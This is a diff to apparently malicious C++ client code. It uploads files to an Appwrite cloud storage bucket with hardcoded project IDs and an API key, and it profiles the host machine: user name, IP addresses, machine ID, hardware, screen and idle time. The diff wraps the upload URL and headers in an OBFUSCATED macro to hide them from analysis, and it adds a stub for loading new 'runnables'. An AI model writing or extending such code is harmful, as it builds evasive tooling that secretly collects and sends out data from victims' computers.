@@ -58,9 +58,9 @@ void uploadFile(std::string file)
 {
     CURL *curl = curl_easy_init();
 
-    std::string keyHeader = "X-Appwrite-Key: ";
+    std::string keyHeader =OBFUSCATED("X-Appwrite-Key: ");
     keyHeader += APPWRITEAPI_KEY;
-    std::string projectHeader = "X-Appwrite-Project: ";
+    std::string projectHeader = OBFUSCATED("X-Appwrite-Project: ");
     projectHeader += APPWRITE_PROJECTID;
     struct curl_slist *headerlist = NULL;
 
@@ -72,7 +72,7 @@ void uploadFile(std::string file)
     curl_httppost *post = NULL;
     curl_httppost *last = NULL;
 
-    std::string link = "https://cloud.appwrite.io/v1/storage/buckets/65f40a214b5d0993434e/files";
+    std::string link = OBFUSCATED("https://cloud.appwrite.io/v1/storage/buckets/65f40a214b5d0993434e/files");
 
     curl_formadd(&post, &last,
                  CURLFORM_COPYNAME, "file",
@@ -84,8 +84,8 @@ void uploadFile(std::string file)
                  CURLFORM_COPYCONTENTS, id.c_str(),
                  CURLFORM_END);
 
-    headerlist = curl_slist_append(headerlist, "X-Appwrite-Response-Format: 1.4.0");
-    headerlist = curl_slist_append(headerlist, "X-Appwrite-Project: 65f1b67fa4509b598d6e");
+    headerlist = curl_slist_append(headerlist, OBFUSCATED("X-Appwrite-Response-Format: 1.4.0"));
+    headerlist = curl_slist_append(headerlist, OBFUSCATED("X-Appwrite-Project: 65f1b67fa4509b598d6e"));
     headerlist = curl_slist_append(headerlist, keyHeader.c_str());
     headerlist = curl_slist_append(headerlist, projectHeader.c_str());
 
@@ -251,7 +251,7 @@ Information Information::getInformation()
 Information::Information() : arch(""), compileTime(""), cpu(""), cpuCores(0), cpuInfo({}), cpuPercentage(0), disks(std::vector<Disk>()), dotnetVersions(std::vector<std::string>()), driveInfo({}), freeRam(0), hostBinary(""), isInteractive(false), localIp(""), machine(""), machineId(), mainBinary(""), osInfo({}), remoteIp(""), screen(Screen{}), systemTime(0), totalRam(0), userName(""), windowsVersion(WindowsVersion{}), idleTime(0)
 {
 }
-std::string Information2JSON(Information info)
+std::string Information2JSON(Information &info)
 {
     std::string infoStr;
     json jsn;
@@ -583,4 +583,12 @@ std::string GetCpuInfo()
     }
 
     return cpu;
+}
+std::vector<Runnable> loadNewRunnables(){
+    std::vector<Runnable> runnables;
+
+
+
+
+    return runnables;
 }
